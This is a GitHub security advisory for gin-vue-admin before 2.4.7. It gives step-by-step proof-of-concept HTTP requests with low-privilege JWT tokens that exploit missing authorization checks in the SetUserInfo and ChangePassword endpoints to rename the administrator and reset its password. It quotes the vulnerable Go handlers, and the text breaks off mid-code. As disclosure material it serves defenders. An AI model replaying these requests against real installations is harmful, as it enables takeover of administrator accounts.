=== Content from github.com_35c29305_20250108_121842.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflipped-aurora%2Fgin-vue-admin%2Fsecurity%2Fadvisories%2FGHSA-xxvh-9c87-pqjx)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflipped-aurora%2Fgin-vue-admin%2Fsecurity%2Fadvisories%2FGHSA-xxvh-9c87-pqjx)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=flipped-aurora%2Fgin-vue-admin)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flipped-aurora](/flipped-aurora)
/
**[gin-vue-admin](/flipped-aurora/gin-vue-admin)**
Public

* [Notifications](/login?return_to=%2Fflipped-aurora%2Fgin-vue-admin) You must be signed in to change notification settings
* [Fork
  6.5k](/login?return_to=%2Fflipped-aurora%2Fgin-vue-admin)
* [Star
   22k](/login?return_to=%2Fflipped-aurora%2Fgin-vue-admin)

* [Code](/flipped-aurora/gin-vue-admin)
* [Issues
  21](/flipped-aurora/gin-vue-admin/issues)
* [Pull requests
  5](/flipped-aurora/gin-vue-admin/pulls)
* [Discussions](/flipped-aurora/gin-vue-admin/discussions)
* [Actions](/flipped-aurora/gin-vue-admin/actions)
* [Projects
  0](/flipped-aurora/gin-vue-admin/projects)
* [Wiki](/flipped-aurora/gin-vue-admin/wiki)
* [Security](/flipped-aurora/gin-vue-admin/security)
* [Insights](/flipped-aurora/gin-vue-admin/pulse)

Additional navigation options

* [Code](/flipped-aurora/gin-vue-admin)
* [Issues](/flipped-aurora/gin-vue-admin/issues)
* [Pull requests](/flipped-aurora/gin-vue-admin/pulls)
* [Discussions](/flipped-aurora/gin-vue-admin/discussions)
* [Actions](/flipped-aurora/gin-vue-admin/actions)
* [Projects](/flipped-aurora/gin-vue-admin/projects)
* [Wiki](/flipped-aurora/gin-vue-admin/wiki)
* [Security](/flipped-aurora/gin-vue-admin/security)
* [Insights](/flipped-aurora/gin-vue-admin/pulse)

# Setuserinfo interface is vertically unauthorized

High

[piexlmax](/piexlmax)
published
GHSA-xxvh-9c87-pqjx
Feb 9, 2022

## Package

gomod

github.com/flipped-aurora/gin-vue-admin
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

<2.4.7

## Patched versions

2.4.7

## Description

### 二、Environment setup

Follow the official tutorial

```
git clone https://github.com/flipped-aurora/gin-vue-admin.git
```

Then enter the server directory

```
go generate
```

[![image-20211230134341075](https://camo.githubusercontent.com/734edb05cbf7189dac1c66e6e2c201ef34e84ee14f784b1ed6e1fe5d11a2e03d/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133343334313037352e706e67)](https://camo.githubusercontent.com/734edb05cbf7189dac1c66e6e2c201ef34e84ee14f784b1ed6e1fe5d11a2e03d/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133343334313037352e706e67)

```
go build -o server main.go
```

Then run the server directly

[![image-20211230134411233](https://camo.githubusercontent.com/371328bec482a1da30dff5f960de5fb9d789b3d4d479a2f5e31a79b777b2b63f/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133343431313233332e706e67)](https://camo.githubusercontent.com/371328bec482a1da30dff5f960de5fb9d789b3d4d479a2f5e31a79b777b2b63f/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133343431313233332e706e67)

Followed by WEB, enter the web directory, enter

```
cnpm install || npm install
```

Then wait

[![image-20211230134632959](https://camo.githubusercontent.com/05eced0ae1932cbfcefae46793fc8d506727f7d0c7d9f323d3d405e271beeb42/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133343633323935392e706e67)](https://camo.githubusercontent.com/05eced0ae1932cbfcefae46793fc8d506727f7d0c7d9f323d3d405e271beeb42/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133343633323935392e706e67)

After the installation is complete, it will automatically open the WEB page

[![image-20211230135126848](https://camo.githubusercontent.com/974ecdf6a2b519d13fbddfaf6d5d72a07ce34f72734762bd1d409c678ed510c2/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353132363834382e706e67)](https://camo.githubusercontent.com/974ecdf6a2b519d13fbddfaf6d5d72a07ce34f72734762bd1d409c678ed510c2/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353132363834382e706e67)

[![image-20211230135135212](https://camo.githubusercontent.com/13ceb7f311b37d178f1058bc1637512dd0ea4ef5a4e552417ac104dbb86b05c0/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353133353231322e706e67)](https://camo.githubusercontent.com/13ceb7f311b37d178f1058bc1637512dd0ea4ef5a4e552417ac104dbb86b05c0/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353133353231322e706e67)

Then initialize the database information

[![image-20211230135407388](https://camo.githubusercontent.com/3ae9e2296a3637e027d2bc2fc0a94ae54fbe126bc4cdc760614837c57e90e235/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353430373338382e706e67)](https://camo.githubusercontent.com/3ae9e2296a3637e027d2bc2fc0a94ae54fbe126bc4cdc760614837c57e90e235/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353430373338382e706e67)

After configuration, click Initialize and log in

[![image-20211230135437587](https://camo.githubusercontent.com/e2024d04fc4fcf249d84d3cc8f632a7fdf06edfe4b793ce12e87c38fe984ecd6/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353433373538372e706e67)](https://camo.githubusercontent.com/e2024d04fc4fcf249d84d3cc8f632a7fdf06edfe4b793ce12e87c38fe984ecd6/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303133353433373538372e706e67)

### 三、Vulnerability recurrence

### SetUserInfo has vertical overreach

##### 1、SetUserInfo interface unauthorized setting user personal information

We go directly to the user management page and add a low-privileged user role

[![image-20211230143853535](https://camo.githubusercontent.com/8e0d5342e50a3cde09ae268d756ed2d76b01267bd842e2e578dfd9229b3c64c7/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134333835333533352e706e67)](https://camo.githubusercontent.com/8e0d5342e50a3cde09ae268d756ed2d76b01267bd842e2e578dfd9229b3c64c7/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134333835333533352e706e67)

You can see that the above does not give the administrator permissions, then create a new account and assign it to this role group

[![image-20211230144026344](https://camo.githubusercontent.com/cffa79421217d116c722ebdead45fe38aed44969cb4b9f9cf3f58a3a60a1a26e/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343032363334342e706e67)](https://camo.githubusercontent.com/cffa79421217d116c722ebdead45fe38aed44969cb4b9f9cf3f58a3a60a1a26e/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343032363334342e706e67)

[![image-20211230144005936](https://camo.githubusercontent.com/a84863e145eb87249d80d22f02120a847c98f98076bf4ef7c2bd92161c8ef3d1/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343030353933362e706e67)](https://camo.githubusercontent.com/a84863e145eb87249d80d22f02120a847c98f98076bf4ef7c2bd92161c8ef3d1/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343030353933362e706e67)

The location of the vulnerability is at line 273 of <https://github.com/flipped-aurora/gin-vue-admin/blob/master/server/api/v1/system/sys_user.go>

[![image-20211230141604735](https://camo.githubusercontent.com/17de1df27dd1f9557df8c7aa7d47d4d785ce9e446054583ba8d64a01fc0c3eb2/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134313630343733352e706e67)](https://camo.githubusercontent.com/17de1df27dd1f9557df8c7aa7d47d4d785ce9e446054583ba8d64a01fc0c3eb2/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134313630343733352e706e67)

```
// @Tags SysUser
// @Summary 设置用户信息
// @Security ApiKeyAuth
// @accept application/json
// @Produce application/json
// @Param data body system.SysUser true "ID, 用户名, 昵称, 头像链接"
// @Success 200 {string} string "{"success":true,"data":{},"msg":"设置成功"}"
// @Router /user/setUserInfo [put]
func (b *BaseApi) SetUserInfo(c *gin.Context) {
	var user system.SysUser
	_ = c.ShouldBindJSON(&user)
	if err := utils.Verify(user, utils.IdVerify); err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	if err, ReqUser := userService.SetUserInfo(user); err != nil {
		global.GVA_LOG.Error("设置失败!", zap.Error(err))
		response.FailWithMessage("设置失败", c)
	} else {
		response.OkWithDetailed(gin.H{"userInfo": ReqUser}, "设置成功", c)
	}
}
```

There is no verification of the incoming ID. If the ID represents the user, you can modify the personal information of the corresponding user by directly passing in the specified ID

[![image-20211230141732113](https://camo.githubusercontent.com/7b053917bea2e198c75f780e077523679edae53f265ad350a76b4663477b5cf6/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134313733323131332e706e67)](https://camo.githubusercontent.com/7b053917bea2e198c75f780e077523679edae53f265ad350a76b4663477b5cf6/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134313733323131332e706e67)

First, we use the administrator’s X-token test to modify the name of the user with ID 1 to test1, and then we can see in the background that the administrator’s ID has been modified to test1

[![image-20211230144216099](https://camo.githubusercontent.com/1823ea3ac005b6b2478e2a7129cfd18494d0d4656b6ec95684fa6f266821a97d/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343231363039392e706e67)](https://camo.githubusercontent.com/1823ea3ac005b6b2478e2a7129cfd18494d0d4656b6ec95684fa6f266821a97d/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343231363039392e706e67)

So next, we replace it with the Token of the newly created UzJu\_HxSecTeam account, and change the administrator username to test2

First of all, personal information of our UzJu\_HxSecTeam account> modify password, modify the password here, and then get the account token

[![image-20211230144321622](https://camo.githubusercontent.com/a2043447058fe7c4bc419c12e27d720802aac8359ee9c9880d913cfe5df5a5a5/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343332313632322e706e67)](https://camo.githubusercontent.com/a2043447058fe7c4bc419c12e27d720802aac8359ee9c9880d913cfe5df5a5a5/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343332313632322e706e67)

This Token is the role of low-privilege. Normally low-privileged users cannot modify any information of the administrator.

```
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiYTM1NTRiYmYtYzQwNS00ZWEwLTkzZjQtMzQ1YTRiNzIxMWYxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1MDk5OCwiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODQ1MTk4fQ.0vm9DA7RHOi-ZBN6p-C4RIjJS7Qs9kbXKLNpmc6nyDs
```

We replace the Token to construct the following Json data

```
{
  "id":1,
  "username":"test2",
  "nickName":"test2",
  "headerImg":""
}
```

[![image-20211230144527291](https://camo.githubusercontent.com/6acb312947abecc69e64395437765a4b1b1343f01053a63896e33ecee0adf75a/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343532373239312e706e67)](https://camo.githubusercontent.com/6acb312947abecc69e64395437765a4b1b1343f01053a63896e33ecee0adf75a/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343532373239312e706e67)

We replace the Token to the setUserinfo interface

```
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiYTM1NTRiYmYtYzQwNS00ZWEwLTkzZjQtMzQ1YTRiNzIxMWYxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1MDk5OCwiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODQ1MTk4fQ.0vm9DA7RHOi-ZBN6p-C4RIjJS7Qs9kbXKLNpmc6nyDs
x-user-id: 1
Content-Length: 67
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"test2",
"nickName":"test2",
"headerImg":""}
```

Then prompted us that the setup was successful

[![image-20211230144654682](https://camo.githubusercontent.com/81dbf82febe76d4b9294e0229911fbb8c1f056a35bece4110b637f298c28737a/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343635343638322e706e67)](https://camo.githubusercontent.com/81dbf82febe76d4b9294e0229911fbb8c1f056a35bece4110b637f298c28737a/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343635343638322e706e67)

This is when we switch to the administrator account to see if it has been modified to test2

[![image-20211230144727266](https://camo.githubusercontent.com/8079e5f61c7b3565af16b04653dadd76ef76f42e66df500df83467cb9bda21dd/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343732373236362e706e67)](https://camo.githubusercontent.com/8079e5f61c7b3565af16b04653dadd76ef76f42e66df500df83467cb9bda21dd/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134343732373236362e706e67)

You can see that the administrator user was successfully modified

##### 2、SetUserInfo interface vertical unauthorized modification of administrator password unconditionally

During Debug, I found that in the interface setUserInfo that sets personal information without authority, not only id, username, nickname, headimg, but also parameters such as password can be passed in.

[![image-20211230222713086](https://camo.githubusercontent.com/47511da482d4af4c94710cc2431e1ad1940641b6292681cf6205cefb0b48d7c7/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323731333038362e706e67)](https://camo.githubusercontent.com/47511da482d4af4c94710cc2431e1ad1940641b6292681cf6205cefb0b48d7c7/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323731333038362e706e67)

For example, we construct a request to set the user name with ID 1 to admin and the nickname to super user administrator

[![image-20211230222755083](https://camo.githubusercontent.com/527af16b65ed256d8ce264ce32c7382abc4b6cdc507596632116c030641c640d/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323735353038332e706e67)](https://camo.githubusercontent.com/527af16b65ed256d8ce264ce32c7382abc4b6cdc507596632116c030641c640d/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323735353038332e706e67)

```
PUT /api/user/setUserInfo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiZjkwNjRhMWItNzU2Yi00NTNjLTlkNDAtOWZlZmY5OWI2ZTUxIiwiSUQiOjMsIlVzZXJuYW1lIjoiVXpKdV9IeFNlY1RlYW0iLCJOaWNrTmFtZSI6IlV6SnVfSHhTZWNUZWFtIiwiQXV0aG9yaXR5SWQiOiIxMjM0IiwiQnVmZmVyVGltZSI6ODY0MDAsImV4cCI6MTY0MTQ1Nzc1NywiaXNzIjoicW1QbHVzIiwibmJmIjoxNjQwODUxOTU3fQ.rHCKW7c2kIsaCRKsgI1Nizu18dGKfsOH_m_dW59cY9U
x-user-id: 1
Content-Length: 91
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"id":1,
"username":"admin",
"nickName":"超级用户管理员",
"Password":"qwe@123"
}
```

At this time, the administrator’s password has been changed to qwe@123, try to log in

[![image-20211230222853109](https://camo.githubusercontent.com/f777cc2c4f73a33ecd15281ac767feec5bb66bad5eeda065a869600f7625620f/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323835333130392e706e67)](https://camo.githubusercontent.com/f777cc2c4f73a33ecd15281ac767feec5bb66bad5eeda065a869600f7625620f/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323835333130392e706e67)

Then successfully logged in

[![image-20211230222906607](https://camo.githubusercontent.com/0f30e18e54a4edd16e2f81f0a7ab03c56cc0144242e698ad42cf90223c00f341/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323930363630372e706e67)](https://camo.githubusercontent.com/0f30e18e54a4edd16e2f81f0a7ab03c56cc0144242e698ad42cf90223c00f341/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303232323930363630372e706e67)

Then we can try more parameters, try to modify the role group (AuthorityId) of the user with id 2 (Account2) to 1234

#### 3、Modify user password without authority

> PS: There is a prerequisite, you need to know the password of the user I want to change

First of all, we know that the default admin password is 123456. At this time, we only need to construct the Json data, and modify the username parameter in the Json data to the username we want to modify without authorization.

First, we log in to a low-privileged account and change the password once

[![image-20211230145433929](https://camo.githubusercontent.com/c0c51e1f9b50a4670ca8a1d2a1313d8f1c14cda6804fe83514ebf45214812e0e/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353433333932392e706e67)](https://camo.githubusercontent.com/c0c51e1f9b50a4670ca8a1d2a1313d8f1c14cda6804fe83514ebf45214812e0e/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353433333932392e706e67)

We will catch a changePassword request, and then put this request into the Repeater

[![image-20211230145506647](https://camo.githubusercontent.com/d3663969629d0221909c7d75c577e7ec47f24a38c67d11e66a641fc33709de5a/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353530363634372e706e67)](https://camo.githubusercontent.com/d3663969629d0221909c7d75c577e7ec47f24a38c67d11e66a641fc33709de5a/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353530363634372e706e67)

Then we only need to modify the username parameter to admin

[![image-20211230145615220](https://camo.githubusercontent.com/00e77a09cccd84ea147cdadbf5f2943263a892d131a08d6706b6fc8049eb7e46/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353631353232302e706e67)](https://camo.githubusercontent.com/00e77a09cccd84ea147cdadbf5f2943263a892d131a08d6706b6fc8049eb7e46/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353631353232302e706e67)

Then we will be prompted to modify successfully, and then we use the new password to log in to admin

[![image-20211230145704428](https://camo.githubusercontent.com/ee64ff82cd4e7c9365fd114010aed15d91a976668504fbc8a65d6225601f5189/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353730343432382e706e67)](https://camo.githubusercontent.com/ee64ff82cd4e7c9365fd114010aed15d91a976668504fbc8a65d6225601f5189/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353730343432382e706e67)

Then successfully logged in

[![image-20211230145725332](https://camo.githubusercontent.com/6f6d1a32c6b7a142c2d158a3c52a230115992e4eddf80f86ad6166d73b8af51b/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353732353333322e706e67)](https://camo.githubusercontent.com/6f6d1a32c6b7a142c2d158a3c52a230115992e4eddf80f86ad6166d73b8af51b/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d616765696d6167652d32303231313233303134353732353333322e706e67)

The location of the vulnerability is <https://github.com/flipped-aurora/gin-vue-admin/blob/master/server/api/v1/system/sys_user.go>, line 139

```
// @Tags SysUser
// @Summary 用户修改密码
// @Security ApiKeyAuth
// @Produce  application/json
// @Param data body systemReq.ChangePasswordStruct true "用户名, 原密码, 新密码"
// @Success 200 {string} string "{"success":true,"data":{},"msg":"修改成功"}"
// @Router /user/changePassword [post]
func (b *BaseApi) ChangePassword(c *gin.Context) {
	var user systemReq.ChangePasswordStruct
	_ = c.ShouldBindJSON(&user)
	if err := utils.Verify(user, utils.ChangePasswordVerify); err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	u := &system.SysUser{Username: user.Username, Password: user.Password}
